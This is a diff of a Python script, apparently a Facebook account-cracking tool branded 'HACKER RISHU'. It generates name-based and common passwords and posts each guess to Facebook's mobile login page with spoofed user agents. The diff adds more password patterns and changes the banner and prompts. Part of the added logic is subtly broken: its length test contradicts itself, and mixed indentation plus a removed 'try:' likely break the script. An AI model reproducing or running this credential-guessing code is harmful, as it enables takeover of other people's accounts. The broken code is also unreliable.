@@ -30,18 +30,16 @@ ip = requests.get('https://api.ipify.org').text
 # Mohon tidak untuk di ubah #
 def logo():
 	print("""                  
-\033[1;92m      ─────█─▄▀█──█▀▄─█──
-\033[1;92m      ────▐▌──────────▐▌──
-\033[1;92m      ────█▌▀▄──▄▄──▄▀▐█──
-\033[1;92m      ───▐██──▀▀──▀▀──██▌──
-\033[1;92m      ──▄████▄──▐▌──▄████▄─   \033[1;92m[•]HACKER RISHU[•]
-\033[1;92m     ╔═════════════════════════════════════════╗                         \033[1;97m
-\033[1;91m     █  \033[1;91m[•] Author     : \033[1;92mRishu Khan            \033[1;91m█ \033[1;97m
-\033[1;91m     █  \033[1;91m[•] Facebook   : \033[1;92mRishu 3:)             \033[1;91m█ \033[1;97m
-\033[1;91m     █  \033[1;91m[•] Whatsapp   : \033[1;92mNhi Hai               \033[1;91m█ \033[1;97m
-\033[1;91m     █  \033[1;91m[•] Grup Fb    : \033[1;92mNhi Hai Mera Aapna    \033[1;91m█ \033[1;97m
-\033[1;91m     █  \033[1;91m[•] Version.   : \033[1;92m0.2                   \033[1;91m█ \033[1;97m
-\033[1;92m     ╚═════════════════════════════════════════╝                      """"") 
+\033[1;92m____▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄_
+\033[1;92m───█▒▒░░░░░░░░░▒▒█───
+\033[1;92m────█░░\n\033[1;91m█░░░░░\n\033[1;91m█░░█────
+\033[1;92m─▄▄──█░░░▀█▀░░░█──▄▄─
+\033[1;92m█░░█─▀▄░░░░░░░▄▀─█░░█
+\033[1;91m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+\033[1;91m█  \033[1;91m[•] Author        : \033[1;92mRishu Khan \033[1;91m█
+\033[1;91m█  \033[1;91m[•] Facebook   :   \033[1;92mRishu 3:)   \033[1;91m█
+\033[1;91m█  \033[1;91m[•] Version.      :   \033[1;92m0.2      \033[1;91m█
+\033[1;91m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
   
  
 kom = 'login'
@@ -226,7 +224,7 @@ def romixyz():
 	
 # Metode api #
 def romi_ganteng():
-	romi = raw_input("\033[0;92m [•] Use manual password? y/t : ")
+	romi = raw_input("\033[0;92m [•] Use manual password? Choose/Auto : ")
 	if romi=='':
 		print ("\033[0;91m [•] choose the right one ") 
 		romi_ganteng()
@@ -382,7 +380,7 @@ def manualbapi():
 	
 # Metode mbasic #
 def romi_gntg():
-	romi = raw_input("\033[0;92m [•] Use manual password? y/t : ")
+	romi = raw_input("\033[0;92m [•] Use manual password? Choose/Auto : ")
 	if romi=='':
 		print ("\033[0;91m [•] choose the right one ") 
 		romi_gntg()
@@ -410,22 +408,26 @@ def langsungbasic():
 			if len(nama)<3:
 				continue
 			else:
-				if len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
+				if len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5 and len(nama) == 6 and len(nama) == 7:
+				        skm.append(nama+"12")
 					skm.append(nama+"123")
-#                 skm.append(nama+"1234")
+#                                       skm.append(nama+"1234")
 					skm.append(nama+"12345")
+					skm.append(nama+"123456")
+					skm.append(nama+"783")
+					skm.append(nama+"007")
 				else:
 					skm.append(nama+"12")
 					skm.append(nama+"123")
 					skm.append(nama+"12345")
 					skm.append(nama+"1234")
+					skm.append(nama+"786")
 					skm.append(nama+"007")
 					skm.append("123456")
 					skm.append("223344")
 					skm.append("786786")
 					skm.append("445566")
 					skm.append("778899")
-		try:
 			for pw in skm:
 				ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
